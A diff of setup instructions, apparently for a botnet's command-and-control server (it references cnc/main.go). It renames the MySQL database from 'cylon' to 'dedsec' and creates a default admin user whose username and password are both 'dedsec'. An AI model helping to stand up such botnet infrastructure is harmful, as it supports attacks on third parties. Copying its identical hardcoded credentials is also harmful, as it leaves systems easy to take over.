@@ -99,8 +99,8 @@ AND CHANGE YOUR PASSWORD MYSQL IN cnc/main.go
 mysql -pYOURPASSWORD
 
 
-CREATE DATABASE cylon;
-use cylon;
+CREATE DATABASE dedsec;
+use dedsec;
 CREATE TABLE `history` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
   `user_id` int(10) unsigned NOT NULL,
@@ -135,7 +135,7 @@ CREATE TABLE `whitelist` (
   PRIMARY KEY (`id`),
   KEY `prefix` (`prefix`)
 );
-INSERT INTO users VALUES (NULL, 'cylon', 'cylon', 0, 0, 0, 0, -1, 1, 30, '');
+INSERT INTO users VALUES (NULL, 'dedsec', 'dedsec', 0, 0, 0, 0, -1, 1, 30, '');
 exit;
 
 ------------------------------------------------------------------------------------
